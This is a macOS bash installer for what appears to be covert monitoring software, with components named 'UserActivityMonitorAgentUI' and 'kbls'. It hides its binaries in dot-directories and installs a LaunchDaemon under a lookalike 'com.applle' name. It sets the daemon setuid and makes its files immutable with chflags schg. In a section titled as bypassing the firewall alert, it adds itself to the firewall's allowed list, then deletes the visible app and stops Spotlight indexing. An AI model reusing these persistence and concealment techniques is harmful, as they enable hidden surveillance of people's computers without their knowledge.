#!/bin/bash

# Exit when a command fails
set -o errexit

# Error when unset variables are found
set -o nounset

# Name of binaries on device
APPL_BLBLU=blblu
APPL_BLBLD=blbld
APPL_BLBLA=blbla
AGENT_UAMA=UserActivityMonitorAgentUI
AGENT_KBLS=kbls

# Define directory variables
APPL_BLBLU_HOME=/usr/libexec/.$APPL_BLBLU
APPL_BLBLU_NAME=$APPL_BLBLU

APPL_BLBLD_HOME=/usr/libexec/.$APPL_BLBLD
APPL_BLBLD_NAME=$APPL_BLBLD

APPL_BLBLA_HOME=/Library/PrivilegedHelperTools/.$APPL_BLBLA
APPL_BLBLA_NAME=$APPL_BLBLA

APPL_BLBLD_PLIST_HOME=/System/Library/LaunchDaemons
APPL_BLBLD_PLIST_NAME=com.applle.blbld.plist
APPL_BLBLD_PLIST_PATH=$APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME

APPL_BLBLA_PLIST_HOME=/Library/LaunchAgents
APPL_BLBLA_PLIST_NAME=com.applle.blbla.plist
APPL_BLBLA_PLIST_PATH=$APPL_BLBLA_PLIST_HOME/$APPL_BLBLA_PLIST_NAME

APPL_BUNDLE_HOME=/Applications/blblu.app
APPL_BUNDLE_NAME=blblu.app

APPL_LOG_HOME=/tmp
APPL_LOG_FILE=$APPL_LOG_HOME/.install-$APPL_BUNDLE_NAME.log
rm -fr $APPL_LOG_FILE

echo "----------------------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "******************** UnLock /usr/libexec/.blblu & blbld & blbla ******************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------------------" >> $APPL_LOG_FILE

if [ -d "$APPL_BLBLA_HOME" ]; then
    sudo chflags -R noschg $APPL_BLBLA_HOME
fi

if [ -d "$APPL_BLBLU_HOME" ]; then
    sudo chflags -R noschg $APPL_BLBLU_HOME
fi

if [ -d "$APPL_BLBLD_HOME" ]; then
    sudo chflags -R noschg $APPL_BLBLD_HOME
fi

if [ -f "$APPL_BLBLA_PLIST_PATH" ]; then
    sudo chflags -R noschg $APPL_BLBLA_PLIST_PATH
fi

if [ -f "$APPL_BLBLD_PLIST_PATH" ]; then
    sudo chflags -R noschg $APPL_BLBLD_PLIST_PATH
fi

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "Remove Pre-login ******************** blbla **************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
# /Library/PrivilegedHelperTools/.blbla
echo "rm -fr $APPL_BLBLA_HOME" >> $APPL_LOG_FILE
rm -fr  $APPL_BLBLA_HOME

# /Library/LaunchAgents/com.applle.blbla.plist
echo "rm -f $APPL_BLBLA_PLIST_HOME/$APPL_BLBLA_PLIST_NAME" >> $APPL_LOG_FILE
rm -f $APPL_BLBLA_PLIST_HOME/$APPL_BLBLA_PLIST_NAME

echo "---------------------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "Clean up any previous installations or processes ******** blbld, blblu **********" >> $APPL_LOG_FILE
echo "---------------------------------------------------------------------------------" >> $APPL_LOG_FILE
set +o errexit

# Stop daemon com.applle.blbld.plist
echo "sudo launchctl stop $APPL_BLBLD_PLIST_NAME" >> $APPL_LOG_FILE
sudo launchctl stop $APPL_BLBLD_PLIST_NAME

# Remove daemon com.applle.blbld.plist
echo "launchctl remove $APPL_BLBLD_PLIST_NAME" >> $APPL_LOG_FILE
sudo launchctl remove $APPL_BLBLD_PLIST_NAME

# Remove daemon direcotry /usr/libexec/.blbld
echo "rm -fr $APPL_BLBLD_HOME" >> $APPL_LOG_FILE
rm -fr $APPL_BLBLD_HOME

# Remove /System/Library/LaunchDaemons/com.applle.blbld.plist
echo "rm -f $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME" >> $APPL_LOG_FILE
rm -f $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME

# Terminate blblu
echo "sudo killall -9 $APPL_BLBLU_NAME" >> $APPL_LOG_FILE
sudo killall -9 $APPL_BLBLU_NAME

# Terminate kbls
echo "sudo killall -9 $AGENT_KBLS" >> $APPL_LOG_FILE
sudo killall -9 $AGENT_KBLS

# Terminate UserActivityMonitorAgentUI
echo "sudo killall -9 $AGENT_UAMA" >> $APPL_LOG_FILE
sudo killall -9 $AGENT_UAMA

# Remove blblu direcotry /usr/libexec/.blblu
echo "rm -fr $APPL_BLBLU_HOME" >> $APPL_LOG_FILE
rm -fr $APPL_BLBLU_HOME


echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "*************************** Log Directory ****************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

echo "sudo mkdir -p /log" >> $APPL_LOG_FILE
sudo mkdir -p /log

echo "sudo chmod 777 /log" >> $APPL_LOG_FILE
sudo chmod 777 /log


echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "****************** Create blblu document directory *******************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
# Create directory /var/.lsalcore
echo "mkdir -p /var/.lsalcore" >> $APPL_LOG_FILE
mkdir -p /var/.lsalcore

echo "chmod 777 /var/.lsalcore" >> $APPL_LOG_FILE
chmod 777 /var/.lsalcore

# Exit when a command fails
set -o errexit

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "Copy Pre-login ********************** blbla **************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

echo "mkdir -p $APPL_BLBLA_HOME" >> $APPL_LOG_FILE
mkdir -p $APPL_BLBLA_HOME

echo "chmod 777 $APPL_BLBLA_HOME" >> $APPL_LOG_FILE
chmod 777 $APPL_BLBLA_HOME

echo "sudo cp -fr $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLA_NAME.app $APPL_BLBLA_HOME/$APPL_BLBLA_NAME" >> $APPL_LOG_FILE
sudo cp -fr $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLA_NAME.app $APPL_BLBLA_HOME/$APPL_BLBLA_NAME

echo "sudo cp -f $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLA_PLIST_NAME $APPL_BLBLA_PLIST_HOME/$APPL_BLBLA_PLIST_NAME" >> $APPL_LOG_FILE
sudo cp -f $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLA_PLIST_NAME $APPL_BLBLA_PLIST_HOME/$APPL_BLBLA_PLIST_NAME

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "**************************** Copy blblu ******************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

# Create blblu directory /usr/libexec/.blblu
echo "mkdir -p $APPL_BLBLU_HOME" >> $APPL_LOG_FILE
mkdir -p $APPL_BLBLU_HOME

# Change mode of /usr/libexec/.blblu to read/write/execute
echo "chmod 777 $APPL_BLBLU_HOME" >> $APPL_LOG_FILE
sudo chmod -R 777 $APPL_BLBLU_HOME

# Copy /Applications/blblu.app /usr/libexec/.blblu/blblu
echo "cp -fr $APPL_BUNDLE_HOME $APPL_BLBLU_HOME/$APPL_BLBLU_NAME" >> $APPL_LOG_FILE
cp -fr $APPL_BUNDLE_HOME $APPL_BLBLU_HOME/$APPL_BLBLU_NAME

# Change mode of /usr/libexec/.blblu to read/write/execute
echo "chmod 777 $APPL_BLBLU_HOME" >> $APPL_LOG_FILE
sudo chmod -R 777 $APPL_BLBLU_HOME

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "********************** Copy blbld (daemon) ***************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

# Create blbld directory /usr/libexec/.blbld
echo "mkdir -p $APPL_BLBLD_HOME" >> $APPL_LOG_FILE
mkdir -p $APPL_BLBLD_HOME

# Change mode of /usr/libexec/.blblu to read/write/execute
echo "chmod 777 $APPL_BLBLD_HOME" >> $APPL_LOG_FILE
chmod 777 $APPL_BLBLD_HOME

# Copy /Applications/blblu.app/Contents/Resources/blbld.app /usr/libexec/.blbld/blbld
echo "cp -fr $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLD_NAME.app $APPL_BLBLD_HOME/$APPL_BLBLD_NAME" >> $APPL_LOG_FILE
cp -fr $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLD_NAME.app $APPL_BLBLD_HOME/$APPL_BLBLD_NAME

# Change mode of /usr/libexec/.blbld/blbld/Contents/MacOS/blbld to 6555
echo "chmod 6555 $APPL_BLBLD_HOME/$APPL_BLBLD_NAME/Contents/MacOS/$APPL_BLBLD_NAME" >> $APPL_LOG_FILE
chmod 6555 $APPL_BLBLD_HOME/$APPL_BLBLD_NAME/Contents/MacOS/$APPL_BLBLD_NAME

# Copy blbld's plist /Applications/blblu.app/Contents/Reources/com.applle.blbld.plist to /System/Library/LaunchDaemons/com.applle.blbld.plist
echo "cp -f $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLD_PLIST_NAME $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME" >> $APPL_LOG_FILE
cp -fr $APPL_BUNDLE_HOME/Contents/Resources/$APPL_BLBLD_PLIST_NAME $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME

# Load daemon /System/Library/LaunchDaemons/com.applle.blbld.plist
echo "sudo launchctl load $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME" >> $APPL_LOG_FILE
sudo launchctl load $APPL_BLBLD_PLIST_HOME/$APPL_BLBLD_PLIST_NAME


echo "--------------------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "******************** Lock /usr/libexec/.blblu & blbld & blbla ******************" >> $APPL_LOG_FILE
echo "--------------------------------------------------------------------------------" >> $APPL_LOG_FILE

if [ -d "$APPL_BLBLA_HOME" ]; then
    sudo chflags -R schg $APPL_BLBLA_HOME
fi

if [ -d "$APPL_BLBLU_HOME" ]; then
    sudo chflags -R schg $APPL_BLBLU_HOME
fi

if [ -d "$APPL_BLBLD_HOME" ]; then
    sudo chflags -R schg $APPL_BLBLD_HOME
fi

if [ -f "$APPL_BLBLA_PLIST_PATH" ]; then
    sudo chflags -R schg $APPL_BLBLA_PLIST_PATH
fi

if [ -f "$APPL_BLBLD_PLIST_PATH" ]; then
    sudo chflags -R schg $APPL_BLBLD_PLIST_PATH
fi

echo "--------------------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "*************************** Bybass the firewall alert **************************" >> $APPL_LOG_FILE
echo "--------------------------------------------------------------------------------" >> $APPL_LOG_FILE

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setallowsigned on

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --remove /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --remove /usr/libexec/.blbld/blbld/Contents/MacOS/blbld

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/libexec/.blblu/blblu/Contents/MacOS/blblu
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/libexec/.blbld/blbld/Contents/MacOS/blbld

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "******************** Remove /Applications/blblu.app ******************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

echo "rm -fr $APPL_BUNDLE_HOME" >> $APPL_LOG_FILE
rm -fr $APPL_BUNDLE_HOME

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "************************** Remove Old Addon **************************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

INIT=/Users
XPINAME=KnowITMac@digitalendpoint.xpi
XPIVERS=addonversion.plist

if [ -d "$INIT" ]; then
    for CHILD in "$INIT"/*
        do
            TEMP=$CHILD/Library/Application\ Support/Firefox/Profiles
            if [ -d "$TEMP" ]; then
                for SUBCHILD in "$TEMP"/*
                    do
                        DELETOR=$SUBCHILD/extensions/$XPINAME;
                        if [ -f "$DELETOR" ]; then
                            rm -fr "$DELETOR"
                        fi
                        DELETOR=$SUBCHILD/extensions/$XPIVERS;
                        if [ -f "$DELETOR" ]; then
                            rm -fr "$DELETOR"
                        fi
                done
            fi
    done
fi

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "************************** Add Ignore Indexing ***********************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE

echo "sudo rm -rf /.metadata_never_index" >> $APPL_LOG_FILE
sudo rm -rf /.metadata_never_index

echo "sudo touch -a /System/.metadata_never_index" >> $APPL_LOG_FILE
sudo touch -a /System/.metadata_never_index

echo "sudo touch -a /tmp/.metadata_never_index" >> $APPL_LOG_FILE
sudo touch -a /tmp/.metadata_never_index

echo "sudo touch -a /usr/.metadata_never_index" >> $APPL_LOG_FILE
sudo touch -a /usr/.metadata_never_index

echo "sudo touch -a ~/Library/.metadata_never_index" >> $APPL_LOG_FILE
sudo touch -a ~/Library/.metadata_never_index

echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
echo "***************** Installation completed successfully ****************" >> $APPL_LOG_FILE
echo "----------------------------------------------------------------------" >> $APPL_LOG_FILE
